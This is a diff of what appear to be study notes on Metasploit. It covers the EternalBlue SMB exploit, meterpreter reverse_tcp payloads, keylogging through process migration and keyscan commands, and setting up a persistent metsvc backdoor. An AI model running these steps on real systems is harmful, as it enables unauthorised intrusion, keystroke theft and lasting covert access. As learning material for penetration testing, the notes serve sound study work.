@@ -17,103 +17,103 @@ Meterpreter:
   payload used for performing actions of the attack stage; keylogging
   for example.
 
-Searching for modules:
+  Searching for modules:
 
-  msf > search eternalBlue
+    msf > search eternalBlue
 
-  Looks for exploits pertaining to this vulnerability.
+    Looks for exploits pertaining to this vulnerability.
 
-Using modules:
+  Using modules:
 
-  msf > use 0
+    msf > use 0
 
-  Uses the first entry of search.
+    Uses the first entry of search.
 
-Listing modules:
+  Listing modules:
 
-  msf > options
+    msf > options
 
-  Lists the options relevant to the module.
+    Lists the options relevant to the module.
 
-Eternal blue remote code execution:
+  Eternal blue remote code execution:
 
-  In the module windows/smb/ms17_010_eternalblue:
+    In the module windows/smb/ms17_010_eternalblue:
 
-  LHOST should be set to the attacking host, the local host; RHOSTS are the targets.
+    LHOST should be set to the attacking host, the local host; RHOSTS are the targets.
 
-    msf > set RHOSTS 192.168.100.2
+      msf > set RHOSTS 192.168.100.2
 
-  LPORT represents the port to be exploited, RHOSTS represents the port to go through on local host.
+    LPORT represents the port to be exploited, RHOSTS represents the port to go through on local host.
 
-  The windows/meterpreter/reverse_tcp path relates to a payload called reverse_tcp.
+    The windows/meterpreter/reverse_tcp path relates to a payload called reverse_tcp.
 
-Running exploits:
+  Running exploits:
 
-  With a module loaded, write the following command.
+    With a module loaded, write the following command.
 
-    mrf > run
+      mrf > run
 
-  This will start the meterpreter session.
+    This will start the meterpreter session.
+    
+    The shell session should look like the following if successful.
+    
+      meterpreter >
+
+  Payloads, a clarification:
+
+    The payload is a program set over the network, there's many designed for
+    all kinds of scenarios.
+
+    There are two types of payload: staged and single.
   
-  The shell session should look like the following if successful.
-  
-    meterpreter >
+    A staged payload consists of two main components, a stub loader and a final stage payload.
 
-Payloads, a clarification:
+    When you deliver windows/meterpreter/reverse_tcp for instance, you actually
+    send the loader first; when the loader is executed, it will ask the handler
+    on the attacker's side to send over the final stage.
 
-  The payload is a program set over the network, there's many designed for
-  all kinds of scenarios.
+    You can think of it as part one and two epoxy resin; both are useless on their
+    own, but they work together for an overall result.
 
-  There are two types of payload: staged and single.
- 
-  A staged payload consists of two main components, a stub loader and a final stage payload.
+    A single stage payload is payload designed to be sent off in one; can be used
+    when the target has no network access.
 
-  When you deliver windows/meterpreter/reverse_tcp for instance, you actually
-  send the loader first; when the loader is executed, it will ask the handler
-  on the attacker's side to send over the final stage.
+    We create a reverse bind connection that's running on the port of the Kali.
 
-  You can think of it as part one and two epoxy resin; both are useless on their
-  own, but they work together for an overall result.
+  Keylogging:
 
-  A single stage payload is payload designed to be sent off in one; can be used
-  when the target has no network access.
+    To key log in a meterpreter session, you need to migrate the payload
+    to another process ID, to hopefully reduce the chance that the payload gets
+    killed by the target operating system.
 
-  We create a reverse bind connection that's running on the port of the Kali.
+      meterpreter > migrate <process ID>
 
-Keylogging:
+    You can list the process IDs by using the PS command:
 
-  To key log in a meterpreter session, you need to migrate the payload
-  to another process ID, to hopefully reduce the chance that the payload gets
-  killed by the target operating system.
+      meterpreter > ps
 
-    meterpreter > migrate <process ID>
+      Process list
 
-  You can list the process IDs by using the PS command:
+      ============
 
-    meterpreter > ps
+        PID Name
+        --- ----
+        1   Name.exe
+        2   Name2.exe
+        3   Name3.exe
+        ... ...
 
-    Process list
+    Then, start the key scan.
 
-    ============
+      meterpreter > keyscan_start
 
-      PID Name
-      --- ----
-      1   Name.exe
-      2   Name2.exe
-      3   Name3.exe
-      ... ...
+      Starting the keystroke sniffer..
 
-  Then, start the key scan.
+    Dump the keyscan.
 
-    meterpreter > keyscan_start
+      meterpreter > keyscan_dump
 
-    Starting the keystroke sniffer..
-
-  Dump the keyscan.
-
-    meterpreter > keyscan_dump
-
-  You can detect keylogging info particular to a process; set the process ID accordingly.
+    You can detect keylogging info particular to a process; set the process ID accordingly.
 
 Back dooring:
 
@@ -122,11 +122,11 @@ Back dooring:
   We do this through a persistent backdoor; even when an exploit is patched
   having a backdoor in place will allow you to get back in without credentials.
 
-  We first set the payload:
+  We first set the exploit:
 
     msf > use exploit/multi/handler
 
-  Then the target host:
+  Then the payload:
 
     msf > set PAYLOAD windows/metsvc_bind_tcp
 
@@ -142,7 +142,7 @@ Back dooring:
 
     meterpreter > run metsvc -h
 
-  There gets the options of this meterpreter script.
+  This gets the options of metsvc meterpreter script.
 
   The -A flag automatically starts the backdoor.
 
@@ -167,12 +167,10 @@ Back dooring:
 
     ~$ sc query metsvc
 
-  Services will attempt to restart themselves if they fail the firs time; task manager can be used to
+  Services will attempt to restart themselves if they fail the first time; task manager can be used to
   see the active processes.
 
-  There's means of backdooring eternalBlue particularly as well.
-
-  Perform the eternalBlue exploit; push the session into the background:
+  Perform the eternalBlue exploit; push the session into the background.
 
     meterpreter > bg
 
@@ -190,7 +188,7 @@ Back dooring:
 
   Set the options accordingly.
 
-  Then go back to the meterpreter session:
+  Then go back to the previous meterpreter session:
 
     msf > set session <session ID>
 
